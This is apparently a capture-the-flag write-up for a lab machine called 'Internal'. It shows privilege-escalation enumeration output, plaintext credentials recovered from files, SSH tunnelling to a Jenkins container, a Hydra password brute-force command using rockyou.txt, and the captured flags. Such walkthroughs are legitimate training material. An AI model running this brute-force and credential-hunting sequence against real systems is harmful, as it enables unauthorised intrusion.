root       923  0.0  0.1  30104  3072 ?        Ss   04:46   0:00 /usr/sbin/cron -f
root       932  0.0  0.2  72300  5596 ?        Ss   04:46   0:00 /usr/sbin/sshd -D
root       933  0.0  2.0 672560 41072 ?        Ssl  04:46   0:07 /usr/bin/containerd
root      1462  0.0  0.2  10772  4920 ?        Sl   04:46   0:00  _ containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d8467c062151e7fb2 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
aubrean+  1510  0.0  0.0   1148     4 ?        Ss   04:46   0:00      _ /sbin/tini -- /usr/local/bin/jenkins.sh
aubrean+  1544  0.2 11.8 2587808 240912 ?      Sl   04:46   0:39          _ java -Duser.home=/var/jenkins_home -Dj






[+] Searching Hostapd config file
hostapd.conf Not Found

[+] Searching wifi conns file
 Not Found

[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd files
.vnc Not Found

[+] Searching ldap directories and their hashes
/etc/ldap
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found

[+] Searching ssl/ssh files
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
  --> Some certificates were found (out limited):
/etc/apache2/sites-enabled
/etc/pollinate/entropy.ubuntu.com.pem

 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No

[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
krb5.conf Not Found
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
kibana.yml Not Found

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
 Not Found

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
cached hashes Not Found

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
No Sockets found in /run/screen/S-www-data.

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file
Found readable /etc/cloud/cloud.cfg
     lock_passwd: True

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files

[+] Searching IRSSI files

[+] Searching Keyring files
Keyring folder: /usr/share/keyrings
/usr/share/keyrings:
total 36
-rw-r--r-- 1 root root 7399 Sep 17  2018 ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root    0 Jan 17  2018 ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 ubuntu-master-keyring.gpg

[+] Searching Filezilla sites file

[+] Searching backup-manager files

[+] Searching uncommon passwd files (splunk)
passwd file: /etc/cron.daily/passwd
passwd file: /etc/pam.d/passwd
passwd file: /usr/bin/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

[+] Searching GitLab related files


[+] Searching PGP/GPG
PGP/GPG software:
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

[+] Searching vim files

[+] Checking if containerd(ctr) is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it

[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
runc was found in /usr/sbin/runc, you may be able to escalate privileges with it

[+] Searching docker files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
lrwxrwxrwx 1 root root 33 Aug  3 03:01 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
total 0
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_merged
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_merged_recursive
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_queued
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_queued_recursive
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_service_bytes
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_service_bytes_recursive
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_service_time
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_service_time_recursive
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_serviced
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_serviced_recursive
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_wait_time
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.io_wait_time_recursive
-rw-r--r-- 1 root root 0 Jan 23 09:01 blkio.leaf_weight
-rw-r--r-- 1 root root 0 Jan 23 09:01 blkio.leaf_weight_device
--w------- 1 root root 0 Jan 23 09:01 blkio.reset_stats
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.sectors
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.sectors_recursive
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.throttle.io_service_bytes
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.throttle.io_serviced
-rw-r--r-- 1 root root 0 Jan 23 09:01 blkio.throttle.read_bps_device
-rw-r--r-- 1 root root 0 Jan 23 09:01 blkio.throttle.read_iops_device
-rw-r--r-- 1 root root 0 Jan 23 09:01 blkio.throttle.write_bps_device
-rw-r--r-- 1 root root 0 Jan 23 09:01 blkio.throttle.write_iops_device
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.time
-r--r--r-- 1 root root 0 Jan 23 09:01 blkio.time_recursive
-rw-r--r-- 1 root root 0 Jan 23 09:01 blkio.weight
-rw-r--r-- 1 root root 0 Jan 23 09:01 blkio.weight_device
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 23 09:01 notify_on_release
-rw-r--r-- 1 root root 0 Jan 23 09:01 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 23 09:01 cpu.cfs_period_us
-rw-r--r-- 1 root root 0 Jan 23 09:01 cpu.cfs_quota_us
-rw-r--r-- 1 root root 0 Jan 23 09:01 cpu.shares
-r--r--r-- 1 root root 0 Jan 23 09:01 cpu.stat
-r--r--r-- 1 root root 0 Jan 23 09:01 cpuacct.stat
-rw-r--r-- 1 root root 0 Jan 23 09:01 cpuacct.usage
-r--r--r-- 1 root root 0 Jan 23 09:01 cpuacct.usage_all
-r--r--r-- 1 root root 0 Jan 23 09:01 cpuacct.usage_percpu
-r--r--r-- 1 root root 0 Jan 23 09:01 cpuacct.usage_percpu_sys
-r--r--r-- 1 root root 0 Jan 23 09:01 cpuacct.usage_percpu_user
-r--r--r-- 1 root root 0 Jan 23 09:01 cpuacct.usage_sys
-r--r--r-- 1 root root 0 Jan 23 09:01 cpuacct.usage_user
-rw-r--r-- 1 root root 0 Jan 23 09:01 notify_on_release
-rw-r--r-- 1 root root 0 Jan 23 09:01 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.procs
--w------- 1 root root 0 Jan 23 09:01 devices.allow
--w------- 1 root root 0 Jan 23 09:01 devices.deny
-r--r--r-- 1 root root 0 Jan 23 09:01 devices.list
-rw-r--r-- 1 root root 0 Jan 23 09:01 notify_on_release
-rw-r--r-- 1 root root 0 Jan 23 09:01 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.clone_children
--w--w--w- 1 root root 0 Jan 23 09:01 cgroup.event_control
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.failcnt
--w------- 1 root root 0 Jan 23 09:01 memory.force_empty
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.kmem.failcnt
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.kmem.limit_in_bytes
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.kmem.max_usage_in_bytes
-r--r--r-- 1 root root 0 Jan 23 09:01 memory.kmem.slabinfo
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.kmem.tcp.failcnt
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.kmem.tcp.limit_in_bytes
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.kmem.tcp.max_usage_in_bytes
-r--r--r-- 1 root root 0 Jan 23 09:01 memory.kmem.tcp.usage_in_bytes
-r--r--r-- 1 root root 0 Jan 23 09:01 memory.kmem.usage_in_bytes
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.limit_in_bytes
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.max_usage_in_bytes
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.move_charge_at_immigrate
-r--r--r-- 1 root root 0 Jan 23 09:01 memory.numa_stat
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.oom_control
---------- 1 root root 0 Jan 23 09:01 memory.pressure_level
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.soft_limit_in_bytes
-r--r--r-- 1 root root 0 Jan 23 09:01 memory.stat
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.swappiness
-r--r--r-- 1 root root 0 Jan 23 09:01 memory.usage_in_bytes
-rw-r--r-- 1 root root 0 Jan 23 09:01 memory.use_hierarchy
-rw-r--r-- 1 root root 0 Jan 23 09:01 notify_on_release
-rw-r--r-- 1 root root 0 Jan 23 09:01 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 23 09:01 notify_on_release
-rw-r--r-- 1 root root 0 Jan 23 09:01 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 23 09:01 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 23 09:01 notify_on_release
-r--r--r-- 1 root root 0 Jan 23 09:01 pids.current
-r--r--r-- 1 root root 0 Jan 23 09:01 pids.events
-rw-r--r-- 1 root root 0 Jan 23 09:01 pids.max
-rw-r--r-- 1 root root 0 Jan 23 09:01 tasks
-rw-r--r-- 1 root root 0 Aug  3 03:01 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket
srw-rw---- 1 root docker 0 Jan 23 04:46 /run/docker.sock

[+] Interesting Firefox Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox

[+] Interesting Chrome Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox


====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9665/bin/ping6
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9665/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/9665/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9665/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/9665/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/8268/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/8268/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/9665/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9665/bin/su
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             27K Oct 10  2019 /snap/core/8268/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K Oct 10  2019 /snap/core/8268/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            134K Oct 11  2019 /snap/core/8268/usr/bin/sudo  --->  /sudo$
-rwsr-sr-x 1 root   root            105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/9665/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/9665/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            146K Jan 31  2020 /usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/9665/usr/bin/sudo  --->  /sudo$
-rwsr-xr-- 1 root   dip             386K Feb 11  2020 /snap/core/9665/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root   root             27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            419K May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root   messagebus       42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            111K Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root            109K Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/9665/usr/bin/mail-unlock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/9665/usr/bin/mail-touchlock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/9665/usr/bin/mail-lock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/8268/usr/bin/mail-unlock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/8268/usr/bin/mail-touchlock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/8268/usr/bin/mail-lock
-rwxr-sr-x 1 root   mail             15K Dec  7  2013 /snap/core/9665/usr/bin/dotlockfile
-rwxr-sr-x 1 root   mail             15K Dec  7  2013 /snap/core/8268/usr/bin/dotlockfile
-rwxr-sr-x 1 root   utmp             10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root   systemd-network  36K Apr  5  2016 /snap/core/9665/usr/bin/crontab
-rwxr-sr-x 1 root   systemd-network  36K Apr  5  2016 /snap/core/8268/usr/bin/crontab
-rwxr-sr-x 1 root   crontab          39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root   tty              14K Jan 17  2018 /usr/bin/bsd-write
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwxr-sr-x 1 root   mlocate          43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/9665/sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/9665/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/8268/sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/8268/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root   shadow           34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow           34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root   ssh             355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root   crontab         351K Mar  4  2019 /snap/core/8268/usr/bin/ssh-agent
-rwxr-sr-x 1 root   shadow           23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root   shadow           71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root   shadow           23K Mar 25  2019 /snap/core/9665/usr/bin/expiry
-rwxr-sr-x 1 root   shadow           61K Mar 25  2019 /snap/core/9665/usr/bin/chage
-rwxr-sr-x 1 root   shadow           23K Mar 25  2019 /snap/core/8268/usr/bin/expiry
-rwxr-sr-x 1 root   shadow           61K Mar 25  2019 /snap/core/8268/usr/bin/chage
-rwxr-sr-x 1 root   tty              27K Oct 10  2019 /snap/core/8268/usr/bin/wall
-rwsr-sr-x 1 root   root            105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root   tty              27K Jan 27  2020 /snap/core/9665/usr/bin/wall
-rwxr-sr-x 1 root   tty              31K Mar  5  2020 /usr/bin/wall
-rwxr-sr-x 1 root   crontab         351K May 26  2020 /snap/core/9665/usr/bin/ssh-agent

[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep

[+] Users with capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities

[+] Files with ACLs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
files with acls in searched folders Not Found

[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

[+] Unexpected in root
/swap.img
/vmlinuz
/initrd.img
/initrd.img.old
/lost+found
/vmlinuz.old

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
total 36
drwxr-xr-x   2 root root 4096 Aug  3 01:50 .
drwxr-xr-x 102 root root 4096 Aug  3 18:41 ..
-rw-r--r--   1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x   1 root root 3417 Jan 15  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x   1 root root  873 Jan 15  2020 Z99-cloudinit-warnings.sh
-rw-r--r--   1 root root  825 Oct 30  2019 apps-bin-path.sh
-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d

[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read opasswd file? ............. No
[+] Can I write in network-scripts? ...... No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 30)
/home/
/root/

[+] Searching folders owned by me containing others files on it

[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 68 Aug  3 12:58 /var/lib/phpmyadmin/blowfish_secret.inc.php
-rw-r----- 1 root www-data 0 Aug  3 12:58 /var/lib/phpmyadmin/config.inc.php
-rw-r----- 1 root www-data 527 Aug  3 12:58 /etc/phpmyadmin/config-db.php
-rw-r----- 1 root www-data 8 Aug  3 12:58 /etc/phpmyadmin/htpasswd.setup

[+] Modified interesting files in the last 5mins (limit 100)
/tmp/enum.txt
/tmp/enumopt.txt
/var/log/syslog
/var/log/auth.log
/var/log/journal/4e97b1deb1894aeda891e28625a8da6f/system.journal

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation

[+] Files inside /home/www-data (limit 20)

[+] Files inside others home (limit 20)

[+] Searching installed mail applications

[+] Mails (limit 50)

[+] Backup folders
drwxr-xr-x 2 root root 4096 Jan 23 06:25 /var/backups
total 948
-rw-r--r-- 1 root root    51200 Aug  9 06:25 alternatives.tar.0
-rw-r--r-- 1 root root    37895 Aug  3 12:58 apt.extended_states.0
-rw-r--r-- 1 root root     3974 Aug  3 03:00 apt.extended_states.1.gz
-rw-r--r-- 1 root root      437 Aug  3 01:31 dpkg.diversions.0
-rw-r--r-- 1 root root      202 Aug  3 01:31 dpkg.diversions.1.gz
-rw-r--r-- 1 root root      207 Aug  3 01:51 dpkg.statoverride.0
-rw-r--r-- 1 root root      171 Aug  3 01:51 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root   649943 Aug  3 12:58 dpkg.status.0
-rw-r--r-- 1 root root   184371 Aug  3 12:58 dpkg.status.1.gz
-rw------- 1 root root      746 Aug  3 03:09 group.bak
-rw------- 1 root shadow    625 Aug  3 03:09 gshadow.bak
-rw------- 1 root root     1626 Aug  3 01:51 passwd.bak
-rw------- 1 root shadow   1056 Aug  3 03:32 shadow.bak
drwxr-xr-x 2 root root 4096 Jul  3  2017 /var/cache/dbconfig-common/backups
total 0

'''

After all auto and manual enumeration lead me to this file

'''

cd opt
$ ls
containerd
wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

now successfully ssh connection occured with the above credentials.

now captured the flag 

THM{int3rna1_fl4g_1}

lets escalate my priviledge to root and check for possible exploits and patching.

ssh -L 1111:172.17.0.2:8080 aubreanna@10.10.10.213
aubreanna@10.10.10.213's password: 
bind [127.0.0.1]:8080: Address already in use
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 23 10:00:56 UTC 2021

  System load:  0.0               Processes:              121
  Usage of /:   63.7% of 8.79GB   Users logged in:        1
  Memory usage: 46%               IP address for eth0:    10.10.10.213
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jan 23 09:50:00 2021 from 10.2.59.217

'''



'''

http://127.0.0.1:1111/login?from=%2F
at this lets try some fuzzer technique
[1111][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
[STATUS] attack finished for 127.0.0.1 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-23 19:38:32


ydra 127.0.0.1 -s 1111 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P ~/payloadList/rockyou.txt


cd opt
ls
note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

root.txt  snap
root@internal:~# cat root.txt 
THM{d0ck3r_d3str0y3r}



'''